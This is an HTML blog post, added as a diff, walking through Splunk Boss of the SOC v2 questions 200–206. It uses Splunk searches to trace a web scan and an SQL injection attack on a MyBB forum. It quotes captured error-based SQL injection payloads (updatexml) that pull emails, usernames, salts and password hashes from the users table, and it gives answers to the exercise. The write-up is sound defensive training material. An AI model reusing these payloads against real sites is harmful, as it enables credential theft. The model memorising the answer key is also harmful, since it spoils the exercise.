@@ -1,0 +1,1301 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>splunk-bots-v2 write up(2)</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+
+    <!-- custom.css -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/custom.css" />
+
+    <!-- 웹 폰트 설정 -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/nanumgothic.css">
+
+    <!-- awesome icon -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <!-- syntax.css -->
+    <link rel="stylesheet" href="/assets/built/syntax.css">
+
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+    
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="wind-flow Tech Blog" />
+    <link rel="shortcut icon" href="https://wind-flow.github.io/assets/built/images/wind-flow.png" type="image/png" />
+    <link rel="canonical" href="https://wind-flow.github.io/splunk-BOTS-v2-part2" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="wind-flow Tech Blog" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="splunk-bots-v2 write up(2)" />
+    <meta property="og:description" content="Splunk BOTS의 데이터셋은 3개입니다. BOTS란? BOTS v1 Write up(1) BOTS v1 Write up(2) - END BOTS v2 Write up(1) BOTS v2 Write up(2) BOTS v2 Write up(3) BOTS v2 Write up(4) BOTS v2 Write up(5) - END BOTS v3 Write up(1) BOTS v3 Write up(2) BOTS v3 Write up(3) BOTS" />
+    <meta property="og:url" content="https://wind-flow.github.io/splunk-BOTS-v2-part2" />
+    <meta property="og:image" content="https://wind-flow.github.io/assets/built/images/splunk/bots/v2/bots-v2.jpg" />
+    <meta property="article:publisher" content="https://www.facebook.com/" />
+    <meta property="article:author" content="https://www.facebook.com/" />
+    <meta property="article:published_time" content="2021-10-04T20:04:36+09:00" />
+    <meta property="article:modified_time" content="2021-10-04T20:04:36+09:00" />
+    <meta property="article:tag" content="Splunk" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="splunk-bots-v2 write up(2)" />
+    <meta name="twitter:description" content="Splunk BOTS의 데이터셋은 3개입니다. BOTS란? BOTS v1 Write up(1) BOTS v1 Write up(2) - END BOTS v2 Write up(1) BOTS v2 Write up(2) BOTS v2 Write up(3) BOTS v2 Write up(4) BOTS v2 Write up(5) - END BOTS v3 Write up(1) BOTS v3 Write up(2) BOTS v3 Write up(3) BOTS" />
+    <meta name="twitter:url" content="https://wind-flow.github.io/" />
+    <meta name="twitter:image" content="https://wind-flow.github.io/assets/built/images/splunk/bots/v2/bots-v2.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="wind-flow Tech Blog" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Splunk" />
+    <meta name="twitter:site" content="@" />
+    <meta name="twitter:creator" content="@" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "wind-flow Tech Blog",
+        "logo": "https://wind-flow.github.io/"
+    },
+    "url": "https://wind-flow.github.io/splunk-BOTS-v2-part2",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://wind-flow.github.io/assets/built/images/splunk/bots/v2/bots-v2.jpg",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://wind-flow.github.io/splunk-BOTS-v2-part2"
+    },
+    "description": "Splunk BOTS의 데이터셋은 3개입니다. BOTS란? BOTS v1 Write up(1) BOTS v1 Write up(2) - END BOTS v2 Write up(1) BOTS v2 Write up(2) BOTS v2 Write up(3) BOTS v2 Write up(4) BOTS v2 Write up(5) - END BOTS v3 Write up(1) BOTS v3 Write up(2) BOTS v3 Write up(3) BOTS"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="splunk-bots-v2 write up(2)" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+                <a class="site-nav-logo" href="https://wind-flow.github.io/">wind-flow Tech Blog</a>
+            
+        
+        
+            <ul class="nav" role="menu">
+  <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+  <li class="nav-about" role="menuitem">
+    <a href="/about/">About</a>
+  </li>
+  <li class="nav-splunk" role="menuitem">
+    <a href="/tag/splunk/">splunk</a>
+  </li>
+  <!-- <li class="nav-python" role="menuitem"><a href="/tag/python/">Python</a></li> -->
+  <li class="nav-archive" role="menuitem">
+    <a href="/archive.html">All Posts</a>
+  </li>
+  <li class="nav-archive" role="menuitem">
+    <a href="/author_archive.html">Tag별 Posts</a>
+  </li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            
+        </div>
+        
+            <a class="subscribe-button" href="#subscribe">search</a>
+        
+    </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full  tag-splunk post tag-splunk ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime=" 4 October 2021"> 4 October 2021</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/splunk/'>SPLUNK</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">splunk-bots-v2 write up(2)</h1>
+            </header>
+
+            <!-- 
+            <figure class="post-full-image" style="background-image: url(/assets/built/images/splunk/bots/v2/bots-v2.jpg)">
+            </figure>
+             -->
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <p><span class="table-of-contents-list">Splunk BOTS의 데이터셋은 3개입니다.</span></p>
+<ul class="table-of-contents-list">
+  <li><a href="./splunk-BOTS-overview">BOTS란? </a></li>
+  <li><a href="./splunk-BOTS-v1-part1">BOTS v1 Write up(1)</a></li>
+  <li><a href="./splunk-BOTS-v1-part2">BOTS v1 Write up(2) - END</a></li>
+  <li><a href="./splunk-BOTS-v2-part1">BOTS v2 Write up(1) </a></li>
+  <li><a href="./splunk-BOTS-v2-part2">BOTS v2 Write up(2) </a></li>
+  <li><a href="./splunk-BOTS-v2-part3">BOTS v2 Write up(3) </a></li>
+  <li><a href="./splunk-BOTS-v2-part4">BOTS v2 Write up(4) </a></li>
+  <li><a href="./splunk-BOTS-v2-part5">BOTS v2 Write up(5) - END</a></li>
+  <li><a href="./splunk-BOTS-v3-part1">BOTS v3 Write up(1)</a></li>
+  <li><a href="./splunk-BOTS-v3-part2">BOTS v3 Write up(2)</a></li>
+  <li><a href="./splunk-BOTS-v3-part3">BOTS v3 Write up(3)</a></li>
+  <li><a href="./splunk-BOTS-v3-part4">BOTS v3 Write up(4) - END</a></li>
+  <li><a href="./splunk-2021-BOTS-END">BOTS v4 결과</a></li>
+</ul>
+
+<p>APT Scenarios:</p>
+
+<p>In this hands-on exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly to assist them with their recent issues.<br />
+이 실습에서는 Wayne Enterprises를 성공적으로 지원하고 Frothly의 Grace Hoppy에게 최근 문제를 지원하도록 추천된 분석가 Alice Bluebird의 페르소나를 가정합니다.</p>
+
+<p>Hunting Scenarios:</p>
+
+<p>PowerShell: Adversaries will use PowerShell Empire to establish a foothold and carry out attacks.<br />
+PowerShell: 적들은 PowerShell Empire를 사용하여 거점을 구축하고 공격을 수행합니다.<br />
+Exfiltration Over Alternative Protocol - FTP: Data Exfiltration may occur using common network protocols, principally FTP<br />
+Exfiltration Over Alternative Protocol - FTP: 데이터 유출은 주로 FTP와 같은 일반적인 네트워크 프로토콜을 사용하여 발생할 수 있습니다.<br />
+Exfiltration Over Alternative Protocol - DNS: Data Exfiltration may occur using common network protocols, specifically DNS<br />
+Exfiltration Over Alternative Protocol - DNS: 데이터 유출은 일반적인 네트워크 프로토콜, 특히 DNS를 사용하여 발생할 수 있습니다.<br />
+Adversary Infrastructure: The adversary has established multiple components of infrastructure beyond what we have already uncovered.<br />
+Adversary Infrastructure: 적군은 우리가 이미 밝혀낸 것 이상의 기반 시설의 여러 구성 요소를 구축했습니다.<br />
+Spearphishing Attachment: Adversaries will attempt to establish a foothold within Froth.ly using Phishing.<br />
+Spearphishing Attachment: 적들은 피싱을 사용하여 Froth.ly 내에 거점을 구축하려고 시도합니다.<br />
+User Execution: Adversaries will attempt to establish a foothold within Froth.ly by enticing a user to execute an action on a file.<br />
+User Execution: 공격자는 사용자가 파일에 대해 작업을 실행하도록 유인하여 Froth.ly 내에서 거점을 설정하려고 시도합니다.<br />
+Persistence - Create Account: An adversary will look to maintain persistence across an enterprise by creating user accounts.<br />
+Persistence - Create Account: 공격자는 사용자 계정을 생성하여 기업 전체에서 지속성을 유지하려고 합니다.<br />
+Persistence - Scheduled Task: An adversary will look to maintain persistence across reboots by using a task scheduler.<br />
+Persistence - Scheduled Task: 공격자는 작업 스케줄러를 사용하여 재부팅 시 지속성을 유지하려고 합니다.<br />
+Indicator Removal On Host: Clearing of audit / event logs could indicate an adversary attempting to cover their tracks.<br />
+Indicator Removal On Host: 감사/이벤트 로그를 지우면 공격자가 자신의 흔적을 덮으려는 것을 나타낼 수 있습니다.<br />
+Reconaissance: User Agent Strings may provide insight into an adversary that they may not have intended to show.<br />
+Reconaissance: 사용자 에이전트 문자열은 의도하지 않은 적에 대한 통찰력을 제공할 수 있습니다.
+OSINT: Identifying publicly available company information and who is accessing it may provide insight into the adversary.<br />
+OSINT: 공개적으로 사용 가능한 회사 정보와 해당 정보에 액세스하는 사람을 식별하면 적에 대한 통찰력을 제공할 수 있습니다.<br />
+Lateral Movement: Adversaries will look to move laterally to other systems using Windows Management Instrumentation (WMI).<br />
+Lateral Movement: 공격자는 WMI(Windows Management Instrumentation)를 사용하여 측면으로 다른 시스템으로 이동합니다.<br />
+Data Staging: Adversaries will stage data prior to exfiltration to make it easier to extract data at a time of their choosing as well as have a central place to place information as it is identified.<br />
+Data Staging: 공격자는 데이터 유출 전에 데이터를 준비하여 원하는 시간에 데이터를 쉽게 추출할 수 있을 뿐만 아니라 식별된 정보를 배치할 중앙 위치를 확보합니다.</p>
+
+<p><img src="https://wind-flow.github.io/assets/built/images/splunk/bots/v2/b21.jpg" alt="Scenario 1" /></p>
+
+<p>The data included in this app was generated in August of 2017 by members of Splunk’s Security Specialist team - Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve and James Brodsky. They stood up a few lab environments connected to the Internet. Within the environment they had a few Windows endpoints instrumented with the Splunk Universal Forwarder and Splunk Stream. The forwarders were configured with best practices for Windows endpoint monitoring, including a full Microsoft Sysmon deployment and best practices for Windows Event logging. The environment included a Palo Alto Networks next-generation firewall to capture traffic and provide web proxy services, and Suricata to provide network-based IDS. This resulted in the dataset below.<br />
+이 앱에 포함된 데이터는 2017년 8월 Splunk의 보안 전문가 팀(Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve 및 James Brodsky)이 생성한 것입니다. 그들은 인터넷에 연결된 몇 개의 실험 환경을 구축했습니다. 환경 내에는 Splunk Universal Forwarder 및 Splunk Stream으로 계측된 몇 개의 Windows 엔드포인트가 있었습니다. Forwarder는 전체 Microsoft Sysmon 배포 및 Windows 이벤트 로깅을 위한 모범 사례를 포함하여 Windows endpoint 모니터링을 위한 모범 사례로 구성되었습니다. 이 데이터셋은 트래픽을 캡처하고 웹 프록시 서비스를 제공하는 Palo Alto Networks 차세대 방화벽과 네트워크 기반 IDS를 제공하는 Suricata가 포함되었습니다. 그 결과 아래 데이터세트가 생성되었습니다.</p>
+
+<p><img src="https://wind-flow.github.io/assets/built/images/splunk/bots/v2/b22.jpg" alt="Scenario 2" /></p>
+
+<p>200	What is the public IPv4 address of the server running www.brewertalk.com?<br />
+www.brewertalk.com의 공개 IPv4 주소는 무엇입니까?</p>
+
+<details>
+  <summary>hint#1</summary>
+  Do you have access to a network diagram? If you do, use it!
+  네트워크 다이어그램에 액세스할 수 있습니까? 있으면, 사용하세요!
+</details>
+
+<details>
+  <summary>hint#2</summary>
+  A Splunk Stream forwarder running in the Frothly on-prem environment would observe http traffic destined for www.brewertalk.com as having an internet routable IP address.<br />
+  Frothly 온프레미스 환경에서 실행되는 Splunk Stream forwarder는 www.brewertalk.com으로 향하는 http 트래픽이 인터넷 라우팅 가능한 IP 주소를 갖는 것으로 관찰합니다.
+</details>
+
+<p>stream:http에서 해당 URL로 검색한 후, dest_ip필드에서 찾을 가능성이 높습니다.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sourcetype=stream:http www.brewertalk.com
+| dedup site dest_ip
+| table site dest_ip
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>site</th>
+      <th>dest_ip</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>www.brewertalk.com</td>
+      <td>172.31.4.249</td>
+    </tr>
+    <tr>
+      <td>www.brewertalk.com</td>
+      <td>52.42.208.228</td>
+    </tr>
+    <tr>
+      <td>ec2-52-40-10-231.us-west-2.compute.amazonaws.com:8088</td>
+      <td>172.31.10.10</td>
+    </tr>
+    <tr>
+      <td>ec2-52-40-10-231.us-west-2.compute.amazonaws.com:8088</td>
+      <td>52.40.10.231</td>
+    </tr>
+    <tr>
+      <td>45.77.65.211:9999</td>
+      <td>45.77.65.211</td>
+    </tr>
+    <tr>
+      <td>brewertalk.com</td>
+      <td>172.31.4.249</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>www.brewertalk.com의 dest_ip의 값을 보면 172.31.4.249와 52.42.208.228이 있습니다.
+문제에서 공개IP를 물어봤으니 사설IP대역 172.31.4.249이 아닌, 52.42.208.228이 공개 IP입니다.</p>
+
+<p>답 : 52.42.208.228</p>
+
+<p>201	Provide the IP address of the system used to run a web vulnerability scan against www.brewertalk.com.<br />
+www.brewertalk.com에 대해 웹 취약점 스캔을 실행하는 데 사용되는 시스템의 IP 주소를 제공하십시오.</p>
+
+<details>
+  <summary>hint#1</summary>
+    App scanners are often 'noisy' and therefore easy to detect with automated correlation searches.<br />
+    앱 스캐너는 '잡음'일 경우가 많기 때문에 자동화된 상관 관계 검색으로 쉽게 감지할 수 있습니다.
+</details>
+
+<details>
+  <summary>hint#2</summary>
+    Drill down into contributing events if you can!<br />
+    가능하면 기여 이벤트를 자세히 살펴보십시오!
+</details>
+
+<p>어떤 url들이 scan당했는지 조사해봅니다.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249
+| stats count by url
+</code></pre></div></div>
+
+<p><strong>http://www.brewertalk.com/숫자/</strong>형식으로 scan을 하고있습니다.<br />
+해당 src_ip를 보면 <strong>45.77.65.211</strong>입니다.</p>
+
+<p>scan이면 request 횟수가 많을것입니다.</p>
+
+<p>www.berkbeer.com의 ip(52.42.208.228, 172.31.4.249)를 dest_ip로 설정하고 count해봅시다.</p>
+
+<p>쿼리결과를 토대로 검증해봅니다.(스캔치고 이벤트 수가 적습니다.)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249
+| stats count by src_ip dest_ip
+| sort -count
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>src_ip</th>
+      <th>dest_ip</th>
+      <th>count</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>45.77.65.211</td>
+      <td>172.31.4.249</td>
+      <td>9708</td>
+    </tr>
+    <tr>
+      <td>52.40.10.231</td>
+      <td>172.31.4.249</td>
+      <td>634</td>
+    </tr>
+    <tr>
+      <td>172.31.10.10</td>
+      <td>52.42.208.228</td>
+      <td>303</td>
+    </tr>
+    <tr>
+      <td>71.39.18.125</td>
+      <td>172.31.4.249</td>
+      <td>160</td>
+    </tr>
+    <tr>
+      <td>174.209.13.154</td>
+      <td>172.31.4.249</td>
+      <td>134</td>
+    </tr>
+    <tr>
+      <td>10.0.2.109</td>
+      <td>52.42.208.228</td>
+      <td>84</td>
+    </tr>
+    <tr>
+      <td>136.0.2.138</td>
+      <td>172.31.4.249</td>
+      <td>24</td>
+    </tr>
+    <tr>
+      <td>136.0.0.125</td>
+      <td>172.31.4.249</td>
+      <td>8</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>45.77.65.211</strong>의 이벤트가 가장 많습니다.</p>
+
+<p>45.77.65.211가 어떤 url들을 요청했는지 조사 합시다.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249 src_ip=45.77.65.211
+| stats values(url) by src_ip
+</code></pre></div></div>
+
+<p>답 : 45.77.65.211</p>
+
+<p>202	The IP address from question 201 is also being used by a likely different piece of software to attack a URI path. What is the URI path? Answer guidance: Include the leading forward slash in your answer. Do not include the query string or other parts of the URI. Answer example: /phpinfo.php<br />
+201번 문제의 IP 주소는 URI 경로를 공격하기 위해 다른 소프트웨어에서도 사용되고 있습니다. URI 경로는 무엇입니까? 답변 안내: 답변에 선행 슬래시를 포함하십시오. 쿼리 문자열이나 URI의 다른 부분을 포함하지 마십시오. 답변 예시: /phpinfo.php</p>
+<details>
+  <summary>hint#1</summary>
+    Analyze all HTTP traffic from the scanning system to www.brewertalk.com, and inspect the different HTTP user agents. A different HTTP user agent often indicates a different HTTP client program was in use.<br />
+    스캐닝 시스템에서 www.brewertalk.com으로의 모든 HTTP 트래픽을 분석하고 다양한 HTTP 사용자 에이전트를 검사합니다. 다른 HTTP 사용자 에이전트는 종종 다른 HTTP 클라이언트 프로그램이 사용 중임을 나타냅니다.
+</details>
+
+<details>
+  <summary>hint#2</summary>
+    For each HTTP user agent, inspect the URI that the user agent is interacting with.<br />
+    각 HTTP 사용자 에이전트에 대해 사용자 에이전트가 상호 작용하는 URI를 검사합니다.
+</details>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sourcetype=stream:http src_ip=45.77.65.211
+</code></pre></div></div>
+
+<p>field중 uri_path 필드가 있으니, 어떤 uri가 있는지 봅시다.</p>
+
+<p><img src="https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-10-24-02-53-51.png" alt="uri_path" /></p>
+
+<p>“/member.php”가 가장 많습니다. 어떤 특이사항이 있는지 봅시다.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sourcetype=stream:http src_ip=45.77.65.211 uri_path="/member.php"
+</code></pre></div></div>
+
+<p>dest_content 필드의 내용을 보면 중간 SQL Injection의 흔적이 보입니다.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT q.*, s.sid
+			FROM mybb_questionsessions s
+			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
+			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 5,1), 32, 31))),NULL) and '1'
+</code></pre></div></div>
+
+<p>/member.php uri에 SQL Injection 공격을 하고있는 것을 알 수 있습니다.</p>
+
+<p>답 : /member.php</p>
+
+<p>203	What SQL function is being abused on the uri path from question 202?<br />
+문제 202의 uri 경로에서 어떤 SQL 함수를 통해 침입시도를 하고 있습니까?</p>
+
+<details>
+  <summary>hint#1</summary>
+    SQL stands for Structured Query Language and it is used to interact with relational databases like mysql. Some common terms in SQL include 'SELECT' 'WHERE' 'FROM' and 'JOIN'.<br />
+    SQL은 Structured Query Language의 약자로 mysql과 같은 관계형 데이터베이스와 상호 작용하는 데 사용됩니다. SQL의 일반적인 용어로는 'SELECT' 'WHERE' 'FROM' 및 'JOIN'이 있습니다.
+</details>
+
+<details>
+  <summary>hint#2</summary>
+    SQL injection vulnerabilities can arise when a programmer does not properly check user input for characters that might have an impact on how the underlying database query is assembled in his or her code. A single quote character provided as input to a web page ' is often a tell-tale sign of a SQL injection attack.<br />
+    SQL injection 취약점은 프로그래머가 기본 데이터베이스 쿼리가 코드에서 어셈블되는 방식에 영향을 미칠 수 있는 문자에 대한 사용자 입력을 적절하게 확인하지 않을 때 발생할 수 있습니다. 웹 페이지에 대한 입력으로 제공되는 작은 따옴표 '는 종종 SQL 주입 공격을 알리는 신호입니다.
+</details>
+
+<details>
+  <summary>hint#3</summary>
+    XML is one of many data formats that can be stored in relational databases like mysql. Some SQL commands in the MySQL database can be used to produce an error that leaks database contents. Look for a SQL command that updates XML.<br />
+    XML은 mysql과 같은 관계형 데이터베이스에 저장할 수 있는 많은 데이터 형식 중 하나입니다. MySQL 데이터베이스의 일부 SQL 명령을 사용하여 데이터베이스 내용을 누출하는 오류를 생성할 수 있습니다. XML을 업데이트하는 SQL 명령을 찾으십시오.
+</details>
+
+<p>문제 202에서 파악한 SQL에서 포함된 함수는 updatexml입니다.</p>
+
+<p>답 : updatexml</p>
+
+<p>204	What is Frank Ester’s password salt value on www.brewertalk.com?<br />
+www.brewertalk.com에서 Frank Ester의 비밀번호의 salt 값은 얼마입니까?</p>
+
+<details>
+  <summary>hint#1</summary>
+    Narrow down the events to only those that include the suspected SQL injection traffic. Stream HTTP events contain the details you need. Filter on the source IP, dest, IP, HTTP user agent and URI path.<br />
+    의심되는 SQL injection 트래픽을 포함하는 이벤트로만 이벤트 범위를 좁힙니다. 스트림 HTTP 이벤트에는 필요한 세부 정보가 포함되어 있습니다. 소스 IP, 대상, IP, HTTP 사용자 에이전트 및 URI 경로를 필터링합니다.
+</details>
+
+<details>
+  <summary>hint#2</summary>
+    These events will probably make a lot more sense if you reverse the Splunk event ordering by piping your search results to the reverse command. This will show you the first SQL injection commands at the top of the list and later events below.<br />
+    검색 결과를 reverse 명령으로 파이프하여 Splunk 이벤트 순서를 반대로 하면 이러한 이벤트가 훨씬 더 의미가 있을 것입니다. 이렇게 하면 목록 상단에 첫 번째 SQL injection 명령이 표시되고 아래에 이후 이벤트가 표시됩니다.
+</details>
+
+<details>
+  <summary>hint#3</summary>
+    There is a lot of data captured in these events. You are looking for two pieces of data in the dest_content field. The first can be found following the string 'XPATH syntax error: '<br />
+    이러한 이벤트에는 많은 데이터가 캡처되어 있습니다. dest_content 필드에서 두 개의 데이터를 찾고 있습니다. 첫 번째는 'XPATH 구문 오류: ' 문자열 다음에서 찾을 수 있습니다.
+</details>
+
+<details>
+  <summary>hint#4</summary>
+    밑을 드래그하시면 힌트가 보입니다.
+</details>
+<p><span style="color:white">
+    The other important piece of data in the dest_content field can be extracted with the following regular expression: ‘&lt;dt&gt;Query:&lt;/dt&gt;\s+&lt;dd&gt;\s+(?<sqli_query>[^&lt;]+)' Look for the sqli_query values that are stealing salt values.<br />
+    dest_content 필드의 다른 중요한 데이터는 다음 정규식으로 추출할 수 있습니다. '&lt;dt&gt;Query:&lt;/dt&gt;\s+&lt;dd&gt;\s+(?<sqli_query>[^&lt;]+)' 솔트 값을 훔치는 sqli_query 값.
+&lt;/span&gt;</sqli_query></sqli_query></span></p>
+
+<p>문제 202번에서 사용했던 쿼리에 frank ester관련 키워드를 추가해봅시다.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sourcetype=stream:http src_ip=45.77.65.211 uri_path=/member.php *frank* OR *ester*
+</code></pre></div></div>
+
+<p>dest_content필드의 중간 내용을 보면 username과 email을 알기위해 SQL injection 공격시도흔적이 보입니다.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 결과
+&lt;dt&gt;SQL Error:&lt;/dt&gt;
+&lt;dd&gt;1105 - XPATH syntax error: ':frankesters47@gmail.com'&lt;/dd&gt;
+&lt;dt&gt;Query:&lt;/dt&gt;
+&lt;dd&gt;
+			SELECT q.*, s.sid
+			FROM mybb_questionsessions s
+			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
+			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT email FROM mybb_users ORDER BY UID LIMIT 0,1)),NULL) and '1'
+		&lt;/dd&gt;
+2. 결과
+&lt;dt&gt;SQL Error:&lt;/dt&gt;
+&lt;dd&gt;1105 - XPATH syntax error: ':frank'&lt;/dd&gt;
+&lt;dt&gt;Query:&lt;/dt&gt;
+&lt;dd&gt;
+			SELECT q.*, s.sid
+			FROM mybb_questionsessions s
+			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
+			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT username FROM mybb_users ORDER BY UID LIMIT 0,1)),NULL) and '1'
+		&lt;/dd&gt;
+
+</code></pre></div></div>
+
+<p>첫번째는 eamil, 두번째는 username 조회시도를 하고있습니다. 해당 이벤트 시간을 기준으로 ±5초로 발생한 SQL문의 이벤트를 봅시다.</p>
+
+<p><img src="https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-10-24-12-09-35.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sourcetype=stream:http src_ip=45.77.65.211 uri_path=/member.php
+| rex field=dest_content "&lt;dt&gt;Query:&lt;/dt&gt;\s+&lt;dd&gt;\s+(?&lt;sqli_query&gt;[^&lt;]+)"
+| rex field=dest_content "&lt;dd&gt;1105 - XPATH syntax error:\s+(?&lt;sql_errcode&gt;[^&lt;]+)"
+| search sqli_query=*
+| table _time sql_errcode sqli_query
+| sort _time
+</code></pre></div></div>
+
+<p>sql_errcode 필드를 보면 아래차례대로 sql injection시도를 하고 있습니다.
+테이블명(mybb_users) -&gt; row수(6) -&gt; uid(1) -&gt; username의 길이(5) -&gt; 유저이름(frank) -&gt; email주소길이(23) -&gt; email(frankesters47@gmail.com) -&gt; salt길이(8) -&gt; salt(gGsxysZL) -&gt; 비밀번호 길이(32)</p>
+
+<p>답 : gGsxysZL</p>
+
+<p>205	What is user btun’s password on brewertalk.com?<br />
+berwertalk.com에서 btun의 비밀번호는 무엇입니까 ?</p>
+
+<details>
+  <summary>hint#1</summary>
+    His hashed password and salt was stolen via SQLi and captured in Splunk. Also note a 'top 1000' password list is available in a Splunk lookup table file called 'top_1000.csv'. Use '| inputlookup top_1000.csv' to inspect it.<br />
+    그의 해시된 암호와 slat값은 SQL injection을 통해 도난당했으며 Splunk에서 발견되었습니다. 또한 'top_1000.csv'라는 Splunk 조회 테이블 파일에서 '상위 1000' 암호 목록을 사용할 수 있습니다. 사용 '| inputlookup top_1000.csv'를 검사하여 검사합니다.
+</details>
+
+<details>
+  <summary>hint#2</summary>
+    By inspecting the code for this forum software, it can be determined that the stored password hash is computed as follows: md5( md5(salt) + md5(plaintext password) ) where '+' is simple string concatenation.<br />
+    이 포럼 소프트웨어의 코드를 검사하여 저장된 암호 해시가 다음과 같이 계산되었음을 확인할 수 있습니다. md5(md5(salt) + md5(일반 텍스트 암호)) 여기서 '+'는 단순히 문자열 연결을 뜻합니다.
+</details>
+
+<details>
+  <summary>hint#3</summary>
+    The Splunk eval command includes an md5 hash function. Beware that the exploit used in this attack chops the final character from the password hash and includes it as a single character string in the next SQLi extraction. When you use this string, either add the character back to the end of the hash, or just use a wildcard match on the beginning of it.<br />
+    Splunk eval 명령에는 md5 해시 함수가 포함되어 있습니다. 이 공격에 사용된 익스플로잇은 비밀번호 해시에서 최종 문자를 잘라내고 다음 SQLi 추출에서 단일 문자열로 포함한다는 점에 유의하십시오. 이 문자열을 사용할 때 해시 끝에 문자를 다시 추가하거나 시작 부분에 와일드카드 일치를 사용하십시오.
+</details>
+
+<details>
+  <summary>hint#4</summary>
+
+</details>
+
+<p>해당 질문은 현 실습 환경에서 제공되지 않는 Splunk ES에서 확인할 수 있는것으로 문제풀이는 하지않겠습니다.</p>
+
+<p>206	What are the characters displayed by the XSS probe? Answer guidance: Submit answer in native language or character set.
